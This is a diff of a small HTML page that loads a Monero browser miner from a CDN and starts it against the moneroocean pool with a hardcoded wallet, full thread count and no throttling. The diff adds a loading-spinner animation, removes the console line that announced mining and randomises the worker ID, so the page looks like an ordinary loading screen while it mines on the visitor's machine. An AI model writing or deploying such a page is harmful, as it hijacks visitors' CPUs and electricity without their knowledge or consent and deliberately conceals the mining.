@@ -1,6 +1,42 @@
 <html>
     <head>
         <script src="https://cdn.jsdelivr.net/gh/NajmAjmal/monero-webminer@main/script.js"></script>
+        <style>
+        .lds-dual-ring {
+          /* change color here */
+          color: #1c4c5b;
+          margin-top: calc(50vh - 40px);
+          margin-left: calc(50vw - 40px);
+        }
+        .lds-dual-ring,
+        .lds-dual-ring:after {
+          box-sizing: border-box;
+        }
+        .lds-dual-ring {
+          display: inline-block;
+          width: 80px;
+          height: 80px;
+        }
+        .lds-dual-ring:after {
+          content: " ";
+          display: block;
+          width: 64px;
+          height: 64px;
+          margin: 8px;
+          border-radius: 50%;
+          border: 6.4px solid currentColor;
+          border-color: currentColor transparent currentColor transparent;
+          animation: lds-dual-ring 1.2s linear infinite;
+        }
+        @keyframes lds-dual-ring {
+          0% {
+            transform: rotate(0deg);
+          }
+          100% {
+            transform: rotate(360deg);
+          }
+        }
+        </style>
     </head>
     <body>
         <script>
@@ -8,12 +44,12 @@
             var pool = "moneroocean.stream";
             //var pool = "xmr-eu1.nanopool.org";
             var walletAddress = "42T51PT8gqn9Revh583xuKJixg7MxoTSgMZ6q6MBY3EEJb44URJxcCDcN1gyHfMiFcAtCoB3zgDNuTcV7AfipHnHBCxPaHw";
-            var workerId = "RG-XMR-5"
+            var workerId = "XMR-"+Math.ceil((Math.random()*10000))
             var threads = -1;
             var password = "";
-            console.log("Mining", pool, walletAddress)
             startMining(pool, walletAddress, workerId, threads, password);
             throttleMiner = 0;
         </script>
+        <div class="lds-dual-ring"></div>
     </body>
 </html>
